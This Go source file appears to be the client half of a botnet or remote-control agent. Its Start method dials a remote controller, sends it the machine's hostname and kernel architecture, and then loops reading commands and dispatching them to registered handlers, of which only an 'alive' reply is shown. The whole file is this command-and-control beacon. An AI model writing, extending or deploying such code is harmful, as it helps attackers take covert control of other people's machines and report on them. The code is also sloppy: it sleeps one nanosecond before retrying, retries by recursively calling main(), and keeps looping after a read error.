package main

import (
	"fmt"
	"github.com/shirou/gopsutil/host"
	"net"
	"strings"
	"time"
)

func (bot *Bot) Start() {

	bot.CmdList.Commands = append(bot.CmdList.Commands, &Command {
		Names: []string{ "alive" },
		Values:	[]string{ },
		function: func(conn net.Conn, _ []string) {
			fmt.Println("Alive")
			conn.Write([]byte("Alive"))
		},
	})


	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", bot.Host, bot.Port))
	if err != nil { fmt.Println(err); time.Sleep(1); main() }

	hostStat, _ := host.Info()
	conn.Write([]byte(hostStat.KernelArch))
	conn.Write([]byte(hostStat.Hostname))


	for {
		var buffer [1024]byte
		n, err := conn.Read(buffer[0:])
		if err != nil { fmt.Println(err) }

		line := strings.TrimSpace(string(buffer[0:n]))
		if line == "exit" { fmt.Println("Killed..."); conn.Close(); return }

		for _, cmd := range bot.CmdList.Commands {
			for _, name := range cmd.Names {
				command := strings.Split(line, " ")[0]
				args := strings.Split(line, " ")[1:]

				_ = fmt.Sprintf("%s -> %s", command, args[0:])

				if command == name {
					cmd.function(conn, args)
				}
			}
		}

	}

}
